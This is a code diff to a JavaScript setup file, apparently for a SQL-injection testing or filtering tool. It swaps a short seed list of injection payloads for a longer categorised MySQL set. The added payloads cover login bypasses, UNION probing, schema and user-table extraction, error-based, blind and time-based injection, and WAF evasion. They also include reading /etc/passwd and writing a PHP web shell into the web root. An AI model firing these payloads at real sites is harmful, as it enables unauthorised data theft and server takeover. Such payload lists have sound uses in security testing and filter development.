@@ -107,29 +107,73 @@ try {
     );
   `);
 
-  // Seed initial payloads if empty
-  const payloadCount = db.prepare("SELECT COUNT(*) as count FROM base_payloads").get().count;
-  if (payloadCount === 0) {
-    const seedPayloads = [
-      { p: "1 OR 1=1", c: 'AUTH_BYPASS' },
-      { p: "admin' --", c: 'AUTH_BYPASS' },
-      { p: "' OR '1'='1", c: 'AUTH_BYPASS' },
-      { p: "1 UNION SELECT 1,2,3", c: 'UNION' },
-      { p: "1 UNION SELECT NULL,NULL,NULL", c: 'UNION' },
-      { p: "1 UNION SELECT @@version,database(),user()", c: 'UNION', db: 'MySQL' },
-      { p: "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT DATABASE()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", c: 'ERROR', db: 'MySQL' },
-      { p: "1 AND SLEEP(5)", c: 'BLIND_TIME', db: 'MySQL' },
-      { p: "1/*!50000UNION*//*!50000SELECT*/1,2", c: 'WAF_BYPASS' },
-      { p: "1 || 2=2", c: 'AUTH_BYPASS' },
-      { p: "1 OR TRUE", c: 'AUTH_BYPASS' },
-      { p: "1 XOR 1=2", c: 'AUTH_BYPASS' },
-      { p: "1' UNION SELECT 1,2#", c: 'UNION', db: 'MySQL' },
-      { p: "1' AND 1=1#", c: 'BOOLEAN', db: 'MySQL' },
-      { p: "' OR 1 REGEXP '.*'", c: 'BYPASS' }
-    ];
-    const insert = db.prepare("INSERT INTO base_payloads (payload, category, db_type) VALUES (?, ?, ?)");
-    seedPayloads.forEach(item => insert.run(item.p, item.c, item.db || 'GENERIC'));
-  }
+    // Seed initial payloads if empty
+    const payloadCount = db.prepare("SELECT COUNT(*) as count FROM base_payloads").get().count;
+    if (payloadCount === 0) {
+      const seedPayloads = [
+          // Testing Injection (Strings & Numeric)
+          { p: "1' AND 1=1", c: 'AUTH_BYPASS' },
+          { p: "1' AND 1=0", c: 'AUTH_BYPASS' },
+          { p: "1-false", c: 'NUMERIC_PROBE' },
+          { p: "1-true", c: 'NUMERIC_PROBE' },
+          { p: "1*56", c: 'NUMERIC_PROBE' },
+          
+          // Login Bypass Patterns
+          { p: "' OR '1", c: 'LOGIN_BYPASS' },
+          { p: "' OR 1 -- -", c: 'LOGIN_BYPASS' },
+          { p: "\" OR \"\" = \"", c: 'LOGIN_BYPASS' },
+          { p: "\" OR 1 = 1 -- -", c: 'LOGIN_BYPASS' },
+          { p: "'='", c: 'LOGIN_BYPASS' },
+          { p: "'LIKE'", c: 'LOGIN_BYPASS' },
+          { p: "'=0--+", c: 'LOGIN_BYPASS' },
+
+          // Union Based - Detect Columns
+          { p: " UNION SELECT NULL", c: 'UNION_PROBE' },
+          { p: " UNION SELECT NULL, NULL", c: 'UNION_PROBE' },
+          { p: " ORDER BY 1,2,3,4,5,6,7,8,9,10", c: 'UNION_PROBE' },
+          { p: "1' LIMIT 1,1 INTO @,@,@--+", c: 'UNION_PROBE' },
+
+          // Extract Database
+          { p: " UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata", c: 'DATA_EXFIL', db: 'MySQL' },
+          { p: " UNION SELECT * FROM (SELECT * FROM users JOIN users b)a", c: 'DATA_EXFIL_NO_INFO_SCHEMA', db: 'MySQL' },
+          { p: " SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME", c: 'DATA_EXFIL_NO_COL_NAME', db: 'MySQL' },
+
+          // Error Based
+          { p: " AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -", c: 'ERROR_BASED', db: 'MySQL' },
+          { p: " AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -", c: 'ERROR_BASED', db: 'MySQL' },
+          { p: " AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -", c: 'ERROR_BASED', db: 'MySQL' },
+          { p: " AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -", c: 'ERROR_BASED', db: 'MySQL' },
+          { p: " AND UUID_TO_BIN(version())='1", c: 'ERROR_BASED', db: 'MySQL' },
+
+          // Blind (Substring/Logic)
+          { p: " AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'", c: 'BLIND', db: 'MySQL' },
+          { p: " AND (SELECT username FROM users WHERE username REGEXP '^.{8,}$')", c: 'BLIND_REGEXP', db: 'MySQL' },
+          { p: " AND MAKE_SET(1<(SELECT(length(version()))),1)", c: 'BLIND_MAKE_SET', db: 'MySQL' },
+
+          // Time Based
+          { p: "+BENCHMARK(40000000,SHA1(1337))+", c: 'TIME_BASED', db: 'MySQL' },
+          { p: "RLIKE SLEEP(5)", c: 'TIME_BASED', db: 'MySQL' },
+          { p: "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR", c: 'TIME_BASED', db: 'MySQL' },
+
+          // DIOS - Dump In One Shot
+          { p: "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)", c: 'DIOS', db: 'MySQL' },
+
+          // Admin Truncation
+          { p: "admin               a", c: 'TRUNCATION', db: 'MySQL' },
+
+          // Read File / Command Ex
+          { p: " UNION ALL SELECT LOAD_FILE('/etc/passwd') --", c: 'FILE_READ', db: 'MySQL' },
+          { p: " UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"/var/www/html/sh.php\"", c: 'SHELL', db: 'MySQL' },
+
+          // WAF Bypass Alternatives
+          { p: " SELECT * FROM mysql.innodb_table_stats", c: 'BYPASS_INFO_SCHEMA', db: 'MySQL' },
+          { p: " SELECT @@innodb_version", c: 'BYPASS_VERSION', db: 'MySQL' },
+          { p: " SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES", c: 'BYPASS_GROUP_CONCAT', db: 'MySQL' },
+          { p: "1.e(SELECT) 1.e,1.e 1.e(FROM) 1.e(WHERE) 1.e('')=", c: 'SCIENTIFIC_BYPASS', db: 'MySQL' }
+      ];
+      const insert = db.prepare("INSERT INTO base_payloads (payload, category, db_type) VALUES (?, ?, ?)");
+      seedPayloads.forEach(item => insert.run(item.p, item.c, item.db || 'GENERIC'));
+    }
 
   // Seed initial blocking rules if empty
   const rulesCount = db.prepare("SELECT COUNT(*) as count FROM blocking_rules").get().count;
